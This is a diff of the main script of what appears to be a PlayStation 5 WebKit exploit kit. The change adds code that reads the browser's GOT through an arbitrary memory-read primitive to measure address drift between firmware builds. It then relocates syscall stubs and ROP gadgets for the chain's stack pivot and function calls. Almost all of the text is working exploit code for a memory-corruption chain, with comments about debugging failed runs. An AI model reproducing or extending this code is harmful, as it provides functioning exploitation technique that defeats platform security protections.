@@ -409,7 +409,7 @@ async function prepare(p) {
        cache-buster, so a reload can serve a stale page that still references an
        old main.js -- twice now a run has been analysed as if it contained a
        change it did not. Stamp the build on screen so that is never in doubt. */
-    jbmark("BUILD", "main.js v=45 | if this is not the version just"
+    jbmark("BUILD", "main.js v=46 | if this is not the version just"
         + " pushed, the console is running a CACHED page and the run means"
         + " nothing -- force a reload");
 
@@ -417,44 +417,51 @@ async function prepare(p) {
         + "-lk=0x" + libKernelBase.toString()
         + "-lc=0x" + libSceLibcInternalBase.toString());
 
-    /* Which build is this REALLY?
+    /* Which build is this REALLY, and where does it differ?
        -----------------------------------------------------------------------
-       Every gadget in offsets/7.00.js decodes correctly in
-       PS5UPDATE-devkit-7_00_00_44, yet only the ones below ~0x12a439 execute:
-       pop rdi/rsi/rsp, mov [rdi],rax and the whole pivot work, while pop rdx,
-       the 8-byte store at 0x7527f0, all four shifts and every syscall stub
-       fail. A wrong base cannot do that -- it would break everything -- and
-       neither can bad luck across nine addresses.
+       The console reports 7.00.00.70 "_manu" (releases/07.00_t_release_manu,
+       release 0x07000070) in its boot log. The profile came from
+       PS5UPDATE-devkit-7_00_00_44 -- 26 revisions away and the only 7.00 PUP
+       available -- so addresses agree up to the first place the two builds
+       diverge and drift after it. That, not a wrong base, is why pop rdi/rsi/
+       rsp and mov [rdi],rax work while the shifts, the 8-byte store at
+       0x7527f0 and every syscall stub do not.
 
-       What does explain it is that the console is on a DIFFERENT 7.00 build
-       (the devkit "manu special" image) that is this one with extra bytes
-       inserted: identical up to the insertion, shifted by its size after it.
-       Two measurements already agreed before this code existed -- the import
-       GOT sitting exactly 0x4000 above its relocation (text ends 0x2de short
-       of a page boundary, so any growth past that moves every later segment up
-       one page), and the parked worker's stack holding lk+0x38f31/0x39843,
-       which are mid-instruction here but become 0x389b1 and 0x392c3 -- two real
-       call-return sites -- once 0x580 is subtracted.
+       Text cannot be compared: libSceNKWebKit's is PF_X only and reading it
+       kills the WebProcess. But libSceNKWebKit IMPORTS hundreds of functions
+       from libkernel_web and libSceLibcInternal, and the loader has already
+       written each callee's real address -- in the build actually running --
+       into a GOT slot that lives in readable data. Pair that with the export's
+       address in our file and the difference is that function's displacement:
 
-       So measure the shift instead of guessing it. Text is execute-only and
-       cannot be compared byte-for-byte, but the modules' own R_X86_64_RELATIVE
-       relocations point INTO text from slots that live in readable data: the
-       qword at `slot` must hold base+addend, so what it actually holds, minus
-       base and addend, is the shift at that address. Sort by addend and the
-       result is a step profile -- 0 below the insertion, the real delta above.
-       Every read lands in mapped RW data, so this cannot crash. */
+           shift(fn) = read8(wkBase + slot + 0x4000) - lkBase - rva_in_our_file
+
+       85 landmarks for libkernel_web, 66 for libc, plus the modules' own
+       relative relocations, plus 200 relocations into libSceNKWebKit's own
+       text. Sorted by rva they give a step profile, and a value is trusted
+       only where the landmarks either side of it AGREE -- inside a step the
+       answer is honestly unknown rather than interpolated.
+
+       21 of the libkernel_web landmarks are syscall stubs whose number is
+       readable in our own file, so for those the console address is READ, not
+       derived. getpid is one of them. Every read is in mapped RW data, so none
+       of this can crash. */
     let SHIFT = { wk: null, lk: null };
-    if (typeof OFFSET_wk_shift_probe !== "undefined"
-        && typeof OFFSET_lk_shift_probe !== "undefined") {
+    if (typeof OFFSET_lk_import_landmarks !== "undefined") {
         const numOf = (v) => (v.hi >>> 0) * 4294967296 + (v.low >>> 0);
         const wkN = numOf(libSceNKWebKitBase);
         const lkN = numOf(libKernelBase);
-        const run = (b, bN, tbl, bias) => tbl.map((e) =>
-            [e[1], numOf(p.read8(b.add32(e[0] + bias))) - bN - e[1]]);
+        const lcN = numOf(libSceLibcInternalBase);
+        const GOT = 0x4000;             // wk's data segments sit one page up
+        const slotAt = (slot) =>
+            numOf(p.read8(libSceNKWebKitBase.add32(slot + GOT)));
+        const viaGot = (tbl, baseN) =>
+            tbl.map((e) => [e[0], slotAt(e[1]) - baseN - e[0]]);
+        const viaOwn = (b, bN, tbl) =>
+            tbl.map((e) => [e[0], numOf(p.read8(b.add32(e[1]))) - bN - e[0]]);
         const steps = (rows) => {
-            const s = rows.slice().sort((a, b) => a[0] - b[0]);
             const g = [];
-            for (const r of s) {
+            for (const r of rows) {
                 const last = g[g.length - 1];
                 if (last && last.d === r[1]) { last.hi = r[0]; last.n++; }
                 else g.push({ d: r[1], lo: r[0], hi: r[0], n: 1 });
@@ -462,95 +469,98 @@ async function prepare(p) {
             return g;
         };
         const hx = (d) => (d < 0 ? "-0x" : "+0x") + Math.abs(d).toString(16);
-        /* One mark per step, not one mark for the whole profile. The screen
-           truncates a mark at 110 characters, and the first attempt lost
-           exactly the part that mattered -- the tail of the step list. */
+        /* One mark per step. The screen truncates at 110 characters and the
+           first attempt lost exactly the tail that mattered. */
         const report = (tag, g) => {
-            jbmark(tag, g.length + " step(s) over " + g.reduce((a, x) =>
-                a + x.n, 0) + " probes");
-            for (let i = 0; i < g.length && i < 10; i++)
+            jbmark(tag, g.length + " step(s) / "
+                + g.reduce((a, x) => a + x.n, 0) + " probes");
+            for (let i = 0; i < g.length && i < 12; i++)
                 jbmark(tag + "-" + (i + 1), hx(g[i].d) + " @0x"
                     + g[i].lo.toString(16) + "..0x" + g[i].hi.toString(16)
                     + " n=" + g[i].n);
         };
-        /* Which bias puts the probe on the right slot? A wrong bias reads a
-           NEIGHBOURING relocation, so the deltas scatter; the right one makes
-           them cluster. Count distinct deltas rather than assuming 0x4000 --
-           libkernel_web turned out to need its own answer. */
-        const biasOf = (b, bN, tbl) => {
-            let best = 0, bestN = 1e9;
-            for (const bias of [0, 0x4000, -0x4000]) {
-                let n;
-                try {
-                    n = new Set(run(b, bN, tbl.filter((e, i) => i % 7 === 0),
-                        bias).map(r => r[1])).size;
-                } catch (e) { continue; }
-                if (n < bestN) { bestN = n; best = bias; }
+        /* The shift at `rva`, or null when the landmarks bracketing it
+           disagree -- i.e. an insertion happened somewhere in between and
+           which side of it this address falls on is not known. Guessing there
+           is what moved pop r8 wrongly and turned a getpid that returned -1
+           into a SIGILL. */
+        const at = (rows, rva) => {
+            let lo = null, hi = null;
+            for (const r of rows) {
+                if (r[0] <= rva) lo = r;
+                if (r[0] >= rva) { hi = r; break; }
             }
-            return [best, bestN];
+            if (lo && hi) return lo[1] === hi[1] ? lo[1] : null;
+            if (lo) return lo[1];       // past the last landmark
+            return null;
         };
+        const byRva = (a, b) => a[0] - b[0];
 
         try {
-            /* libkernel_web. The eight controls are .data.rel.ro slots pointing
-               at RODATA strings; they came back 0/8 exact on 7.00.00.70, which
-               is not a failure of the base -- the worker hijack proves the base
-               is right -- but a sign that libkernel_web's rodata content itself
-               moved between .44 and .70. So report the control deltas instead
-               of demanding zero, and let the reader judge. */
-            const lkB = biasOf(libKernelBase, lkN, OFFSET_lk_shift_probe);
-            const lkCtl = run(libKernelBase, lkN, OFFSET_lk_shift_control, 0);
-            jbmark("SHIFT-LK-CTL", "rodata ptrs: "
-                + lkCtl.map(r => hx(r[1])).join(" "));
-            const lkG = steps(run(libKernelBase, lkN, OFFSET_lk_shift_probe,
-                lkB[0]));
-            jbmark("SHIFT-LK-BIAS", "bias=" + hx(lkB[0]) + " distinct=" + lkB[1]
-                + " | worker stack says lk text is +0x580 (0x38f31-0x580"
-                + "=0x389b1)");
-            report("SHIFT-LK", lkG);
+            const lkRows = viaGot(OFFSET_lk_import_landmarks, lkN)
+                .concat(viaOwn(libKernelBase, lkN, OFFSET_lk_shift_probe))
+                .sort(byRva);
+            report("SHIFT-LK", steps(lkRows));
+            const lcRows = viaGot(OFFSET_lc_import_landmarks, lcN).sort(byRva);
+            report("SHIFT-LC", steps(lcRows));
+            const wkRows = viaOwn(libSceNKWebKitBase, wkN,
+                OFFSET_wk_shift_probe.concat(
+                    typeof OFFSET_wk_shift_probe_gap !== "undefined"
+                        ? OFFSET_wk_shift_probe_gap : [])
+                    .map(e => [e[0], e[1] + GOT])).sort(byRva);
+            report("SHIFT-WK", steps(wkRows));
 
-            /* libSceNKWebKit. 160 probes, densest between 0x120000 and 0x220000
-               because the boundary was thought to sit between the highest
-               gadget that works (0x12a439) and the lowest that does not
-               (0x21461c). The first measurement put it far higher -- one step
-               of +0x2a0 above ~0x4b0ea0 -- which fits five of the six gadgets
-               known to fail and leaves pop rdx as the odd one out. */
-            const wkB = biasOf(libSceNKWebKitBase, wkN, OFFSET_wk_shift_probe);
-            const wkG = steps(run(libSceNKWebKitBase, wkN,
-                OFFSET_wk_shift_probe, wkB[0]));
-            jbmark("SHIFT-WK-BIAS", "bias=" + hx(wkB[0]) + " distinct="
-                + wkB[1]);
-            report("SHIFT-WK", wkG);
+            /* Read, not derived: these 21 stubs are imported by name, so their
+               console address comes straight out of the GOT. No bracket, no
+               interpolation, and no assumption that the stub grid is
+               unchanged -- 7.00.00.70 demonstrably inserted stubs into it. */
+            const exact = {};
+            let nExact = 0;
+            for (const e of OFFSET_lk_syscall_landmarks) {
+                const a = slotAt(e[1]) - lkN;
+                if (a > 0x1000 && a < 0x60000) {
+                    syscall_map[e[0]] = a; exact[e[0]] = 1; nExact++;
+                }
+            }
+            jbmark("SYSCALL-EXACT", nExact + "/"
+                + OFFSET_lk_syscall_landmarks.length + " read from the GOT"
+                + " | getpid 0x36760->0x"
+                + ((syscall_map[0x14] || 0)).toString(16));
 
-            /* Report-only by default. Applying the first measurement moved
-               pop r8 and pop r9 -- which fcall() uses -- and turned a getpid
-               that merely returned -1 into a SIGILL, i.e. it made the run die
-               EARLIER. A measurement this indirect has to be corroborated by
-               the gadget self-test before it drives the tables. */
-            if (typeof OFFSET_apply_measured_shift !== "undefined"
-                && OFFSET_apply_measured_shift) {
-                if (lkG.length === 1 && lkG[0].d !== 0
-                    && Math.abs(lkG[0].d) <= 0x8000) {
-                    SHIFT.lk = lkG[0].d;
-                    for (const k in syscall_map) syscall_map[k] += SHIFT.lk;
-                    jbmark("SHIFT-LK-APPLIED", hx(SHIFT.lk) + " | getpid 0x"
-                        + ((syscall_map[0x14] || 0) - SHIFT.lk).toString(16)
-                        + "->0x" + (syscall_map[0x14] || 0).toString(16));
-                }
-                if (wkG.length === 2 && wkG[0].d === 0 && wkG[1].d > 0
-                    && wkG[1].d <= 0x8000) {
-                    SHIFT.wk = wkG[1].d;
-                    const cut = wkG[1].lo;
-                    let moved = 0;
-                    for (const k in wk_gadgetmap)
-                        if (wk_gadgetmap[k] >= cut) {
-                            wk_gadgetmap[k] += SHIFT.wk; moved++;
-                        }
-                    jbmark("SHIFT-WK-APPLIED", hx(SHIFT.wk) + " above 0x"
-                        + cut.toString(16) + " | " + moved + " gadget(s)");
-                }
+            /* Everything else moves by the step it sits in, or not at all. */
+            let sFix = 0, sUnk = 0;
+            for (const k in syscall_map) {
+                if (exact[k]) continue;
+                const d = at(lkRows, syscall_map[k]);
+                if (d === null) { sUnk++; continue; }
+                syscall_map[k] += d; if (d) sFix++;
+            }
+            jbmark("SYSCALL-SHIFTED", sFix + " moved, " + sUnk
+                + " left alone (inside a step), " + nExact + " exact");
+
+            /* Refuse to half-apply the gadget map. If any gadget the chain
+               itself runs falls inside a step, moving the others desyncs the
+               chain in a way that is far harder to read than leaving all of
+               them wrong. */
+            const CORE = ["pop rdi", "pop rsi", "pop rdx", "pop rcx", "pop rax",
+                "pop rsp", "pop r8", "pop r9", "mov [rdi], rax",
+                "mov [rdi], rsi", "ret"];
+            const unsure = [];
+            for (const k in wk_gadgetmap)
+                if (at(wkRows, wk_gadgetmap[k]) === null) unsure.push(k);
+            const blocking = unsure.filter(k => CORE.indexOf(k) !== -1);
+            if (blocking.length) {
+                jbmark("SHIFT-WK-BLOCKED", "not applied: " + blocking.join(",")
+                    + " sit inside a step, so their side of it is unknown");
             } else {
-                jbmark("SHIFT-HELD", "measured only -- set"
-                    + " OFFSET_apply_measured_shift to act on it");
+                let moved = 0;
+                for (const k in wk_gadgetmap) {
+                    const d = at(wkRows, wk_gadgetmap[k]);
+                    if (d) { wk_gadgetmap[k] += d; moved++; }
+                }
+                jbmark("SHIFT-WK-APPLIED", moved + " gadget(s) moved"
+                    + (unsure.length ? " | left alone: " + unsure.join(",") : "")
+                    + " | pop rdx 0x" + wk_gadgetmap["pop rdx"].toString(16));
             }
         } catch (e) {
             jbmark("SHIFT-FAILED", String((e && e.message) || e));
@@ -1717,4 +1727,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=45`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=46`);
